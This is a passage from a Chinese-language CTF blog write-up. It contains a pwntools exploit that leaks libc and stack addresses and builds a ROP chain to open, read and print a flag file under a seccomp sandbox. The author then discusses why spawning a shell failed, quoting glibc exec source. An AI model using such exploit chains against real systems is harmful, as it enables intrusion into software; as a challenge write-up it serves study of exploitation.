class="string">b&#x27;&lt;&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;&lt;&#x27;</span>*<span class="number">0x28</span>+<span class="string">b&#x27;.&gt;&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;&lt;&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;,&gt;&#x27;</span>*(<span class="number">23</span>*<span class="number">8</span>) <span class="comment"># ret</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x17E3)&#x27;) #17D9 write  1757 jmp rax 17E3 read</span></span><br><span class="line"><span class="comment">#payload=b&#x27;&gt;&#x27;*0x238+b&#x27;.&gt;&#x27;*7+b&#x27;.&#x27;+b&#x27;&lt;&#x27;*7+b&#x27;,&gt;&#x27;*0x8 # libc main</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libcbase=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    libcbase+=(p.recv(<span class="number">1</span>))</span><br><span class="line">stack=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    stack+=(p.recv(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">libc_base=u64(libcbase)-<span class="number">0x24083</span></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">myclose=libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">myread=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mywrite=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">myopen=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">onegadget=libc_base+<span class="number">0xe3b01</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret =libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line"></span><br><span class="line">stack=u64(stack)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="built_in">hex</span>(pop_rdi_ret))</span><br><span class="line"><span class="comment">#success(hex(onegadget))</span></span><br><span class="line"><span class="comment">#success(hex(system))</span></span><br><span class="line"></span><br><span class="line">success(<span class="built_in">hex</span>(myclose))</span><br><span class="line"><span class="comment">#print(hex(og1))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(8):</span></span><br><span class="line"><span class="string">    temp=(pop_rdi_ret&gt;&gt;(8*i))&amp;0xff</span></span><br><span class="line"><span class="string">    #success(hex(temp))</span></span><br><span class="line"><span class="string">    p.send(p8(temp))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">binsh=libc_base+0x1B45BD</span></span><br><span class="line"><span class="string">for i in range(8):</span></span><br><span class="line"><span class="string">    temp=(binsh&gt;&gt;(8*i))&amp;0xff</span></span><br><span class="line"><span class="string">    #success(hex(temp))</span></span><br><span class="line"><span class="string">    p.send(p8(temp))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(8):</span></span><br><span class="line"><span class="string">    temp=(ret&gt;&gt;(8*i))&amp;0xff</span></span><br><span class="line"><span class="string">    #success(hex(temp))</span></span><br><span class="line"><span class="string">    p.send(p8(temp))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(8):</span></span><br><span class="line"><span class="string">    temp=(system&gt;&gt;(8*i))&amp;0xff</span></span><br><span class="line"><span class="string">    #success(hex(temp))</span></span><br><span class="line"><span class="string">    p.send(p8(temp))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mwrite</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        temp=(a&gt;&gt;(<span class="number">8</span>*i))&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="comment">#print(hex(temp))</span></span><br><span class="line">        p.send(p8(temp))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">flag_addr=stack-<span class="number">0x20</span></span><br><span class="line">mwrite(pop_rdi_ret)</span><br><span class="line">mwrite(<span class="number">1</span>)</span><br><span class="line">mwrite(myclose)</span><br><span class="line">mwrite(pop_rdi_ret)</span><br><span class="line">mwrite(flag_addr)</span><br><span class="line">mwrite(pop_rsi_ret)</span><br><span class="line">mwrite(<span class="number">0</span>)</span><br><span class="line">mwrite(myopen)</span><br><span class="line">mwrite(pop_rdi_ret)</span><br><span class="line">mwrite(<span class="number">1</span>)</span><br><span class="line">mwrite(pop_rdx_ret)</span><br><span class="line">mwrite(<span class="number">0x30</span>)</span><br><span class="line">mwrite(pop_rsi_ret)</span><br><span class="line">mwrite(stack-<span class="number">0x60</span>)</span><br><span class="line">mwrite(myread)</span><br><span class="line">mwrite(pop_rdi_ret)</span><br><span class="line">mwrite(<span class="number">2</span>)</span><br><span class="line">mwrite(pop_rsi_ret)</span><br><span class="line">mwrite(stack-<span class="number">0x60</span>)</span><br><span class="line">mwrite(pop_rdx_ret)</span><br><span class="line">mwrite(<span class="number">0x30</span>)</span><br><span class="line">mwrite(mywrite)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;cat flag&#x27;)</span></span><br><span class="line"><span class="comment">#p.close()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>本题的沙箱是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x02 0x00000000  if (A != read) goto 0006</span><br><span class="line"> 0004: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0005: 0x25 0x01 0x00 0x00000001  if (A &gt; 0x1) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我一开始看到没禁用exec ，想当然的就去getshell了，结果就是onegadget或是system(‘&#x2F;bin&#x2F;sh’) 都打不通</p>
+<p>还有一个比较神奇的是 在gdb内是可以成功exec shell的</p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/af8d218e0724e37d045bc4890222ad1.png" alt="af8d218e0724e37d045bc4890222ad1"></p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/d01a8dd846186396b65ba5990bc1d94.jpg" alt="d01a8dd846186396b65ba5990bc1d94"></p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/c2157f6041d2371fc4fa615cc27ca63.png" alt="c2157f6041d2371fc4fa615cc27ca63"></p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/58226cc68b861eb9a465e2f20b7f04f.png" alt="58226cc68b861eb9a465e2f20b7f04f"></p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/97baddb643185d9ab5d9ae1294a441c.png" alt="97baddb643185d9ab5d9ae1294a441c"></p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/42a7d4cd6d6a1d887227fda67e5cd83.png" alt="42a7d4cd6d6a1d887227fda67e5cd83"></p>
+<p>目前我还不知道原因，作为基本原则，库函数应总是为其打开的文件设置执行时关闭（close-on-exec）标志，故标准输入输出错误应该是会被重新关闭再打开的？</p>
+<p>我后面去查阅了execve.c 的源码，确实有一些对文件描述符的处理，</p>
+<p>具体的在 <code>/hurd/hurdexec.c</code> 中，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_hurd_dtable != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     dtable = __alloca (dtablesize * <span class="keyword">sizeof</span> (dtable[<span class="number">0</span>]));</span><br><span class="line">     ulink_dtable = __alloca (dtablesize * <span class="keyword">sizeof</span> (ulink_dtable[<span class="number">0</span>]));</span><br><span class="line">     dtable_cells = __alloca (dtablesize * <span class="keyword">sizeof</span> (dtable_cells[<span class="number">0</span>]));</span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dtablesize; ++i)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">hurd_fd</span> *<span class="title">const</span> <span class="title">d</span> =</span> _hurd_dtable[i];</span><br><span class="line">  <span class="keyword">if</span> (d == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      dtable[i] = MACH_PORT_NULL;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  __spin_lock (&amp;d-&gt;port.lock);</span><br><span class="line">  <span class="keyword">if</span> (d-&gt;flags &amp; FD_CLOEXEC)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This descriptor is marked to be closed on exec.</span></span><br><span class="line"><span class="comment">	 So don&#x27;t pass it to the new program.  */</span></span><br><span class="line">      dtable[i] = MACH_PORT_NULL;</span><br><span class="line">      <span class="keyword">if</span> (pdp &amp;&amp; d-&gt;port.port != MACH_PORT_NULL)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* We still need to deallocate the ports.  */</span></span><br><span class="line">	  *pdp++ = d-&gt;port.port;</span><br><span class="line">	  <span class="keyword">if</span> (d-&gt;ctty.port != MACH_PORT_NULL)</span><br><span class="line">	    *pdp++ = d-&gt;ctty.port;</span><br><span class="line">	&#125;</span><br><span class="line">      __spin_unlock (&amp;d-&gt;port.lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (pdp &amp;&amp; d-&gt;ctty.port != MACH_PORT_NULL)</span><br><span class="line">	<span class="comment">/* All the elements of DTABLE are added to PLEASE_DEALLOC</span></span><br><span class="line"><span class="comment">	   below, so we needn&#x27;t add the port itself.</span></span><br><span class="line"><span class="comment">	   But we must deallocate the ctty port as well as</span></span><br><span class="line"><span class="comment">	   the normal port that got installed in DTABLE[I].  */</span></span><br><span class="line">	*pdp++ = d-&gt;ctty.port;</span><br><span class="line">      dtable[i] = _hurd_port_locked_get (&amp;d-&gt;port, &amp;ulink_dtable[i]);</span><br><span class="line">      dtable_cells[i] = &amp;d-&gt;port;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>带有FD_CLOEXEC 标志的确实是关闭了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (pdp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Request the exec server to deallocate some ports from us if</span></span><br><span class="line"><span class="comment">     the exec succeeds.  The init ports and descriptor ports will</span></span><br><span class="line"><span class="comment">     arrive in the new program&#x27;s exec_startup message.  If we</span></span><br><span class="line"><span class="comment">     failed to deallocate them, the new program would have</span></span><br><span class="line"><span class="comment">     duplicate user references for them.  But we cannot deallocate</span></span><br><span class="line"><span class="comment">     them ourselves, because we must still have them after a failed</span></span><br><span class="line"><span class="comment">     exec call.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; _hurd_nports; ++i)</span><br><span class="line">    *pdp++ = ports[i];</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dtablesize; ++i)</span><br><span class="line">    *pdp++ = dtable[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是实在是木有找到是在哪 触发了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A = fd # read(fd, buf, count)</span><br><span class="line">if (A &gt; 0x1)  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>有可能是新起的shell 对 一些文件有读操作？ 但是我去翻阅shell.c 源码，一阵头大，毫无头猪 T.T</p>
+<p>如果有师傅知道具体是什么原因的话可以写邮件教教，感谢！</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>7r1p13J</span>
+                    </p>
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/11/02/%E8%A6%86%E5%86%99mobprobe_path/">覆写mobprobe_path</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© 7r1p13J | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
